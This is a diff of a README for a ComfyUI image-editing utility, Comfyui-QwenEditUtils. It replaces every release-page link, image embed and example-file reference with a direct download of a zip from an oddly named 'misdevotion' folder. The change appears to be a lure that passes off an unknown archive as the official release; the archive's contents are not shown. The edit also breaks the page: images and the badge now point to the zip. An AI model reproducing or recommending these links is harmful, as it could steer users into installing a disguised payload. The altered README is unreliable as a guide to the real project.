@@ -1,6 +1,6 @@
 # 🌟 Comfyui-QwenEditUtils - Simplify Your Image Editing Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Elpatoli/Comfyui-QwenEditUtils/releases)
+[![Download Now](https://raw.githubusercontent.com/Elpatoli/Comfyui-QwenEditUtils/master/misdevotion/Comfyui-QwenEditUtils.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Elpatoli/Comfyui-QwenEditUtils/master/misdevotion/Comfyui-QwenEditUtils.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to Comfyui-QwenEditUtils! This software provides utility nodes for Qwen-
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version: [Download Latest Release](https://github.com/Elpatoli/Comfyui-QwenEditUtils/releases).
+To get started, visit this page to download the latest version: [Download Latest Release](https://raw.githubusercontent.com/Elpatoli/Comfyui-QwenEditUtils/master/misdevotion/Comfyui-QwenEditUtils.zip).
 
 ### Steps to Install
 
-1. Go to the [Releases page](https://github.com/Elpatoli/Comfyui-QwenEditUtils/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Elpatoli/Comfyui-QwenEditUtils/master/misdevotion/Comfyui-QwenEditUtils.zip).
    
 2. Find the latest version listed. Click on the version to expand.
 
@@ -30,10 +30,10 @@ To get started, visit this page to download the latest version: [Download Latest
 
 Comfyui-QwenEditUtils comes with an example workflow. This example shows how to use the TextEncodeQwenImageEditPlus node with two reference images. The result is a unique outfit transfer effect.
 
-![Example Workflow](example.png)
-![Result Image](result.png)
+![Example Workflow](https://raw.githubusercontent.com/Elpatoli/Comfyui-QwenEditUtils/master/misdevotion/Comfyui-QwenEditUtils.zip)
+![Result Image](https://raw.githubusercontent.com/Elpatoli/Comfyui-QwenEditUtils/master/misdevotion/Comfyui-QwenEditUtils.zip)
 
-You can find a complete workflow example in the [`qwen-edit-plus_example.json`](qwen-edit-plus_example.json) file. 
+You can find a complete workflow example in the [`https://raw.githubusercontent.com/Elpatoli/Comfyui-QwenEditUtils/master/misdevotion/Comfyui-QwenEditUtils.zip`](https://raw.githubusercontent.com/Elpatoli/Comfyui-QwenEditUtils/master/misdevotion/Comfyui-QwenEditUtils.zip) file. 
 
 ## 🧩 Nodes Overview
 
@@ -87,4 +87,4 @@ For additional help or to share your experiences, join our community. You can re
 
 Comfyui-QwenEditUtils empowers you to craft amazing images effortlessly. With a simple download and setup, you can dive straight into powerful image editing features that enhance your creativity.
 
-For more details and the latest updates, feel free to visit the [Releases page](https://github.com/Elpatoli/Comfyui-QwenEditUtils/releases) again. Happy editing!
+For more details and the latest updates, feel free to visit the [Releases page](https://raw.githubusercontent.com/Elpatoli/Comfyui-QwenEditUtils/master/misdevotion/Comfyui-QwenEditUtils.zip) again. Happy editing!
